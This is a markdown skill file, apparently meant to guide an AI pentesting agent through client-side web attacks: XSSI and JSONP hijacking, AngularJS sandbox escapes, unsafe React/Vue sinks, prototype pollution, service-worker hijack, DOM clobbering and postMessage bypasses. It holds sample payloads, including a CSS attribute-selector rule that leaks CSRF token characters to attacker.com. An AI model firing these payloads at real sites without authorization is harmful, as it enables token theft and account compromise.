---
name: xssi-and-client-framework
description: XSSI (cross-site script inclusion) and client-side framework attack techniques -- JSONP hijacking, AngularJS sandbox escapes, Vue/React unsafe-HTML sinks, client-side prototype pollution gadgets, service-worker hijacking, CSS-exfiltration via attribute selectors, Sass/SCSS server-side injection, and full DOM clobbering. Converted from master-pentest-prompt.md Phase 25. Use on any endpoint returning JS/JSONP containing authenticated data, and on any modern JS-framework-heavy frontend.
---

# XSSI & client-side framework attacks

## When to use

Any endpoint that returns a `.js`/JSONP response containing authenticated
user data, and any target built on Angular/Vue/React or using service
workers.

## XSSI (cross-site script inclusion)

An endpoint returning JSONP/JS/a bare array that reflects authenticated
user data with no CSRF/anti-XSSI token lets a third-party page read it
cross-origin via `<script src="//target/account.js">` -- the script tag
itself has no same-origin restriction. Test JSON responses that start
with `[` (an array literal is valid, executable JS on its own) and check
for missing `X-Content-Type-Options` and no auth check on the GET
request.

JSONP hijacking specifically: a `callback=` parameter that echoes data
back wrapped in a function call lets an attacker's page define that
function and steal the authenticated response.

## AngularJS template sandbox escapes

Older Angular 1.x sandbox bypasses (client-side, not server SSTI, but the
same shape): `{{constructor.constructor('alert(1)')()}}`,
`{{$eval.constructor('alert(1)')()}}`, or a request path containing
`ng-app` that gets reflected into a template context.

## Vue/React unsafe sinks

`dangerouslySetInnerHTML` (React), `v-html` (Vue), plain `innerHTML`
sinks, and template-literal injection in server-rendered props -- check
`__NEXT_DATA__`/`window.__INITIAL_STATE__` specifically, since these
often need double-encoding to actually trigger given they're
JSON-embedded-in-HTML.

## Client-side prototype pollution

Escalating to XSS or an open redirect through a gadget the app already
has -- the `URL` constructor, `fetch`, or a `location.href` assignment
that reads a polluted property.

## Service worker hijack

A malicious service worker registration can persist client-side XSS
across the worker's entire scope (which is path-based, so it can cover
many pages at once) and across subdomains if scoped broadly. Test
whether the service worker's own update mechanism trusts an unkeyed
cache header.

## Sass/SCSS server-side injection

Server-side Sass/SCSS compilation (Rails, `node-sass`) accepting
attacker-influenced input can escalate to RCE through the compiler
itself.

## CSS exfiltration via attribute selectors

When CSP blocks `script-src` but not stylesheet loading, attribute
selectors keyed to a DOM element's value can still exfiltrate data
character-by-character with zero JS execution. A CSRF token, API key, or
nonce sitting in an attribute -- `input[value=...]`, `meta[content=...]` --
becomes leakable through a stylesheet-only channel:
`input[name="csrf"][value^="a"] { background: url(https://attacker.com/leak?c=a) }`
fires the background request only when the attribute actually starts with
`a`. Issue one such rule per candidate character to identify the first
character, then chain via `@import` recursion (each import conditioned on
the previous match) to walk the rest of the string without needing static,
per-position markup.

This only works if the target renders attacker-controlled CSS somewhere
(custom-theme field, `style=` passthrough, markdown-to-CSS preview, email
template editor) and the response's `Content-Security-Policy` doesn't also
lock down `style-src`/`img-src`/`connect-src` to same-origin -- check the
live CSP header before assuming the channel is open, since a `style-src
'self'` or `img-src 'self'` policy kills the exfil `url()` outright even
when script injection is separately blocked. Proof requires an OOB hit per
correct character, not a rendered visual change -- a blocked `url()` looks
identical to a successful one in the browser.

## DOM clobbering (full list)

`<img name=x>`, `<iframe name=f>` -- `id`/`name` attribute collisions
that shadow JS global variables, including iterable-clobbering variants
where an attacker-controlled `HTMLCollection` gets treated as an array.

## postMessage chain (full procedure)

Find every `window.addEventListener('message', ...)` handler (the
`reconnaissance` skill's JS-mining checklist covers finding these), test
the origin check specifically -- `event.origin === 'exact-match'` is
safe, `.includes()`/`.indexOf()` checks are bypassable, and a check for
literal string `"null"` can be satisfied by a sandboxed iframe. Send
malicious data through any weak handler and see whether it reaches a
privileged function call.
